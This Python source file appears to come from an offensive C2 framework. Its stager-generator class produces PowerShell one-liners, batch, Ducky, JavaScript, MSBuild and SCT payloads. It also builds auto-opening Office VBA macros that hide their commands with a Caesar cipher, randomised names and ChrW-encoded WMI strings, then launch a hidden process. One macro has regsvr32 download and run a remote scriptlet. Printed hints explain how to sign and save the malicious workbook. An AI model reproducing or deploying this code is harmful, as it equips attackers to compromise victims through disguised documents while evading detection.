# -*- coding: utf8 -*-
import config as cfg
from lib import helpers

#****************************************************************************************
# Class generating all type of stagers, based on some powershell code in all cases
#****************************************************************************************
class GenStager:

	#-----------------------------------------------------------
	@classmethod
	def oneLiner(cls, stagerParameters):
		"""Creates a powershell one liner command line using base64 encoded powershell script"""

		# Construct the powershell code from a template, substituting palceholders with proper parameters
		posh = helpers.convertFromTemplate(stagerParameters, cfg.defaultPath['poshTpl'])

		if posh == None: return
		
		# Turn the powershell code into a suitable powershell base64 encoded one line command
		base64Payload = helpers.powershellEncode(posh)
		oneLiner = helpers.convertFromTemplate({'payload': base64Payload}, cfg.defaultPath['onelinerTpl'])
		return oneLiner

	#-----------------------------------------------------------
	@classmethod
	def batch(cls, stagerParameters):
		"""Creates a Windows batch file (.bat) that launches a powershell one liner command"""

		# First generate the powershell one liner
		oneLiner = cls.oneLiner(stagerParameters)

		batch = helpers.convertFromTemplate({'oneliner': oneLiner}, cfg.defaultPath['batchTpl'])
		if batch == None: return
				
		try:
			with open(cfg.defaultPath['batchStager'],"w+") as f:
				f.write(batch)
				f.close()
				print helpers.color("[+] Batch stager saved in [{}]".format(cfg.defaultPath['batchStager']))
		except IOError:
			print helpers.color("[!] Could not write stager file [{}]".format(cfg.defaultPath['batchStager']))

	#-----------------------------------------------------------
	@classmethod
	def macro(cls, stagerParameters):
		"""Creates an Office VBA macro that launches a powershell one liner command"""
		
		# First generate the powershell one liner
		oneLiner = cls.oneLiner(stagerParameters)
		
		# Scramble the oneliner with a dumb caesar cipher :-) Simple obfuscation will do
		key = helpers.randomInt(0,94) # 94 is the range of printable ASCII chars (between 32 and 126)
		scrambledOneliner = ""
		for char in oneLiner:
			num = ord(char) - 32 # Translate the working space, 32 being the first printable ASCI char
			shifted = (num + key)%94 + 32
			if shifted == 34:
				scrambledOneliner += "\"{}".format(chr(shifted)) # Handling the double quote print problem in VBA
			else:
				scrambledOneliner += chr(shifted)

		# Split this scrambled oneliner is 50 chars long chunk of strings
		chunks = list(helpers.chunks(scrambledOneliner, 50))

		# This is the actual VBA code to launch powershell using WMI services
		# Variable's names are randomized
		varKey = helpers.randomString(5)
		varStr =  helpers.randomString(5)
		varObjWMI = helpers.randomString(5)
		varObjStartup = helpers.randomString(5)
		varObjConfig = helpers.randomString(5)
		varObjProcess = helpers.randomString(5)

		payload = "\tDim {} As String\n".format(varStr)
		payload += "\t{} = \"".format(varStr) + str(chunks[0]) + "\"\n"
		for chunk in chunks[1:]:
		    payload += "\t{} = {} + \"".format(varStr, varStr) + str(chunk) + "\"\n"

		# Auto opening functions for both Word and Excel
		macro = "Sub Auto_Open()\n"
		macro += "\tComputeTable\n"
		macro += "End Sub\n\n"
		macro = "Sub AutoOpen()\n"
		macro += "\tComputeTable\n"
		macro += "End Sub\n\n"
		macro += "Sub Document_Open()\n"
		macro += "\tComputeTable\n"
		macro += "End Sub\n\n"
		macro += "Sub Workbook_Open()\n"
		macro += "\tComputeTable\n"
		macro += "End Sub\n\n"

		macro += "Public Function ComputeTable() As Variant\n"
		macro += "\tDim {} As Integer\n".format(varKey)
		macro += "\t{} = {}\n".format(varKey, key)
		macro += payload
		
		# Payload decryption stub = inverse caesar
		macro += "\tDim i, n, s As Integer\n"
		macro += "\tFor i = 1 To Len({})\n".format(varStr)
		macro += "\t\tn = Asc(Mid({}, i, 1))\n".format(varStr)
		macro += "\t\ts = n - {}\n".format(varKey)
		macro += "\t\tIf s < 32 Then\n"
		macro += "\t\t\ts = s + 94\n"
		macro += "\t\tEnd If\n"
		macro += "\t\tMid({}, i, 1) = Chr(s)\n".format(varStr)
		macro += "\tNext\n"

		# WMI Process instantiation stub
		#macro += "\tSet {} = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")\n".format(varObjWMI)
		# Somehow hidden like this:
		macro += "\tSet {} = GetObject(ChrW(119) & ChrW(105) & ChrW(110) & ChrW(109) & ChrW(103) & ChrW(109) & ChrW(116) & ChrW(115) _\n".format(varObjWMI)
		macro += "\t\t& ChrW(58) & ChrW(92) & ChrW(92) & ChrW(46) & ChrW(92) & ChrW(114) & ChrW(111) & ChrW(111) & ChrW(116) & ChrW(92) _\n"
		macro += "\t\t& ChrW(99) & ChrW(105) & ChrW(109) & ChrW(118) & ChrW(50))\n"


		#macro += "\tSet {} = {}.Get(\"Win32_ProcessStartup\")\n".format(varObjStartup, varObjWMI)
		# Somehow hidden like this:
		macro += "\tSet {} = {}.Get(ChrW(87) & ChrW(105) & ChrW(110) & ChrW(51) & ChrW(50) & ChrW(95) & ChrW(80) & ChrW(114) & ChrW(111) _\n".format(varObjStartup, varObjWMI)
		macro += "\t\t& ChrW(99) & ChrW(101) & ChrW(115) & ChrW(115) & ChrW(83) & ChrW(116) & ChrW(97) & ChrW(114) & ChrW(116) _\n"
		macro += "\t\t& ChrW(117) & ChrW(112))\n"
		
		
		macro += "\tSet {} = {}.SpawnInstance_\n".format(varObjConfig, varObjStartup)
		macro += "\t{}.ShowWindow = 0\n".format(varObjConfig)
		
		#macro += "\tSet {} = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n".format(varObjProcess)
		# Somehow hidden like this:
		macro += "\tSet {} = GetObject(ChrW(119) & ChrW(105) & ChrW(110) & ChrW(109) & ChrW(103) & ChrW(109) & ChrW(116) & ChrW(115) _\n".format(varObjProcess)
		macro += "\t\t& ChrW(58) & ChrW(92) & ChrW(92) & ChrW(46) & ChrW(92) & ChrW(114) & ChrW(111) & ChrW(111) & ChrW(116) & ChrW(92) _\n"
		macro += "\t\t& ChrW(99) & ChrW(105) & ChrW(109) & ChrW(118) & ChrW(50) & ChrW(58) & ChrW(87) & ChrW(105) & ChrW(110) & ChrW(51) _\n"
		macro += "\t\t& ChrW(50) & ChrW(95) & ChrW(80) & ChrW(114) & ChrW(111) & ChrW(99) & ChrW(101) & ChrW(115) & ChrW(115))\n"

		macro += "\t{}.Create {}, Null, {}, intProcessID\n".format(varObjProcess, varStr, varObjConfig)
		macro += "End Function\n"

		try:
			with open(cfg.defaultPath['macroStager'], "w+") as f:
				f.write(macro)
				f.close()
				print helpers.color("[+] Macro stager saved in [{}]".format(cfg.defaultPath['macroStager']))
				print helpers.color("[*] Hint: Use this VBA macro in Excel, sign it even with a self-signed certificate, and save it in format 'Excel 97-2003'")
		except IOError:
			print helpers.color("[!] Could not write stager file [{}]".format(cfg.defaultPath['macroStager']))
			
	#-----------------------------------------------------------
	@classmethod
	def ducky(cls, stagerParameters):
		"""Creates an ducky command file that launches a powershell one liner command"""
		
		# First generate the powershell one liner
		oneLiner = cls.oneLiner(stagerParameters)
		
		# Construct the ducky file from a template, substituting palceholders with proper parameters
		ducky = helpers.convertFromTemplate({'oneliner': oneLiner}, cfg.defaultPath['duckyTpl'])
		if ducky == None: return

		try:
			with open(cfg.defaultPath['duckyStager'],"w+") as f:
				f.write(ducky)
				f.close()
				print helpers.color("[+] Ducky stager saved in [{}]".format(cfg.defaultPath['duckyStager']))
		except IOError:
			print helpers.color("[!] Could not write stager file [{}]".format(cfg.defaultPath['duckyStager']))

	#-----------------------------------------------------------
	@classmethod
	def javascript(cls, stagerParameters):
		"""Creates a javascript file that launches a powershell one liner command"""
		
		# First generate the powershell one liner
		oneLiner = cls.oneLiner(stagerParameters)
		
		# Construct the javascript file from a template, substituting palceholders with proper parameters
		javascript = helpers.convertFromTemplate({'oneliner': oneLiner}, cfg.defaultPath['javascriptTpl'])
		if javascript == None: return

		try:
			with open(cfg.defaultPath['javascriptStager'],"w+") as f:
				f.write(javascript)
				f.close()
				print helpers.color("[+] Javascript stager saved in [{}]".format(cfg.defaultPath['javascriptStager']))
		except IOError:
			print helpers.color("[!] Could not write stager file [{}]".format(cfg.defaultPath['javascriptStager']))

	#-----------------------------------------------------------
	@classmethod
	def msbuild(cls, stagerParameters):
		"""Creates an msbuild.exe compilation file that launches a powershell one liner command"""
		
		# Construct the msbuild file from a template, substituting palceholders with proper parameters
		msbuild = helpers.convertFromTemplate(stagerParameters, cfg.defaultPath['msbuildTpl'])
		if msbuild == None: return
		
		try:
			with open(cfg.defaultPath['msbuildStager'],"w+") as f:
				f.write(msbuild)
				f.close()
				print helpers.color("[+] Msbuild stager saved in [{}]".format(cfg.defaultPath['msbuildStager']))
		except IOError:
			print helpers.color("[!] Could not write stager file [{}]".format(cfg.defaultPath['msbuildStager']))

	#-----------------------------------------------------------
	@classmethod
	def sct(cls, stagerParameters):
		"""Creates a sct file, to be used with a regsrv32.exe call, that launches a powershell one liner command"""
		
		# First generate the powershell one liner
		oneLiner = cls.oneLiner(stagerParameters)
		
		# Construct the SCT file from a template, substituting palceholders with proper parameters
		sct = helpers.convertFromTemplate({'oneliner': oneLiner}, cfg.defaultPath['sctTpl'])
		if sct == None: return

		try:
			with open(cfg.defaultPath['sctStager'],"w+") as f:
				f.write(sct)
				f.close()
				print helpers.color("[+] SCT stager saved in [{}]".format(cfg.defaultPath['sctStager']))
				print helpers.color("[*] Hint: Serve this file on a web server, then use the 'genStager2' command to create a VBA macro stager based on this SCT file")
		except IOError:
			print helpers.color("[!] Could not write stager file [{}]".format(cfg.defaultPath['sctStager']))

	#-----------------------------------------------------------
	@classmethod
	def macro_sct(cls, sctUrl):
		"""Creates an Office VBA macro that uses the regsvr32.exe JScript code execution trick from @subTee to load an SCT file stager"""
		
		# The shell command to be executed. It spawns a regsvr32.exe process to download the SCT stager from a URL and executed it
		shellCommand = "regsvr32.exe /s /n /u /i:" + sctUrl + " scrobj.dll"

		# Scramble the shell command with a dumb caesar cipher :-) Simple obfuscation will do
		key = helpers.randomInt(0,94) # 94 is the range of printable ASCII chars (between 32 and 126)
		scrambledShellCommand= ""
		for char in shellCommand:
			num = ord(char) - 32 # Translate the working space, 32 being the first printable ASCI char
			shifted = (num + key)%94 + 32
			if shifted == 34:
				scrambledShellCommand += "\"{}".format(chr(shifted)) # Handling the double quote print problem in VBA
			else:
				scrambledShellCommand += chr(shifted)

		# Variable's names are randomized
		varStr = helpers.randomString(5)
		varKey = helpers.randomString(5)

		# Auto opening functions for both Word and Excel
		macro = "Sub Auto_Open()\n"
		macro += "\tComputeTable\n"
		macro += "End Sub\n\n"
		macro = "Sub AutoOpen()\n"
		macro += "\tComputeTable\n"
		macro += "End Sub\n\n"
		macro += "Sub Document_Open()\n"
		macro += "\tComputeTable\n"
		macro += "End Sub\n\n"
		macro += "Sub Workbook_Open()\n"
		macro += "\tComputeTable\n"
		macro += "End Sub\n\n"

		macro += "Public Function ComputeTable() As Variant\n"
		macro += "\tDim {} As String\n".format(varStr)
		macro += "\t{} = \"{}\"\n".format(varStr, scrambledShellCommand)

		macro += "\tDim {} As Integer\n".format(varKey)
		macro += "\t{} = {}\n".format(varKey, key)
		
		# scrambled shell Command decryption stub = inverse caesar
		macro += "\tDim i, n, s As Integer\n"
		macro += "\tFor i = 1 To Len({})\n".format(varStr)
		macro += "\t\tn = Asc(Mid({}, i, 1))\n".format(varStr)
		macro += "\t\ts = n - {}\n".format(varKey)
		macro += "\t\tIf s < 32 Then\n"
		macro += "\t\t\ts = s + 94\n"
		macro += "\t\tEnd If\n"
		macro += "\t\tMid({}, i, 1) = Chr(s)\n".format(varStr)
		macro += "\tNext\n"


		macro += "\tresult = Shell({}, 0)\n".format(varStr)
		macro += "End Function\n"

		try:
			with open(cfg.defaultPath['macroStager'], "w+") as f:
				f.write(macro)
				f.close()
				print helpers.color("[+] Macro stager saved in [{}]".format(cfg.defaultPath['macroStager']))
				print helpers.color("[*] Hint: Use this VBA macro in Excel, sign it even with a self-signed certificate, and save it in format 'Excel 97-2003'")
		except IOError:
			print helpers.color("[!] Could not write stager file [{}]".format(cfg.defaultPath['macroStager']))